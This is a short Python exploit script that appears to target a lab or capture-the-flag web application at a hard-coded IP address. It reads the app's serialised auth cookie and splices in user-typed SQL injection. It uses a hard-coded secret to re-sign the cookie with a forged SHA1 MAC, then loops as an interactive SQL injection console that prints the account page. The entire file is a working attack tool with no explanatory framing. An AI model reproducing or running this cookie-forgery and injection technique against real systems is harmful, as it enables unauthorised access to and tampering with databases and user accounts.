#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Yanis Alim

import requests
import urllib.parse
import hashlib

SECRET  = "Co:6x,1B;S1$6T2V"
MAIL    = "test@test.com"
PASS    = "test"

LOGIN   = "http://132.227.89.21/?page=login_form"
ACC     = "http://132.227.89.21/?page=account"
HEADERS = { "Referer": "http://132.227.89.21/?page=login" }
DATA    = { "mail" : MAIL, "pass": PASS}

def forge_cookie(auth, mac, sqli) :
    index   = auth.index('"id";s:') + len('"id";s:')
    part1   = auth[:index] + str(len(sqli)) + ':"'
    part2   = auth[ auth.index('";s:5:"admin"') : ]
    auth    = part1 + sqli + part2
    payload = SECRET + auth
    mac     = hashlib.sha1( payload.encode() ).hexdigest()
    auth    = urllib.parse.quote(urllib.parse.quote(auth))
    return auth, mac
    
if __name__ == '__main__' :
    s = requests.Session()
    while True :
        r = s.post(LOGIN, headers=HEADERS, data=DATA)

        cookies = r.headers['Set-Cookie'].split(";")
        auth    = cookies[0].split('=')[1]
        mac     = cookies[2].split(',')[1].split('=')[1]

        auth = urllib.parse.unquote(urllib.parse.unquote(auth))
    
        sql = input("SQL injection > ").strip()
        auth, mac = forge_cookie(auth, mac, "' {}; -- - #".format(sql))
        my_cookie = { "auth":auth, "mac":mac }
        s.cookies.set('auth', None)
        s.cookies.set('auth', auth)
        s.cookies.set('mac', None)
        s.cookies.set('mac', mac)
        text = s.get(ACC).text
        start = text.index("<h1>")
        end   = text.index("</html>")
        print(text[start:end])
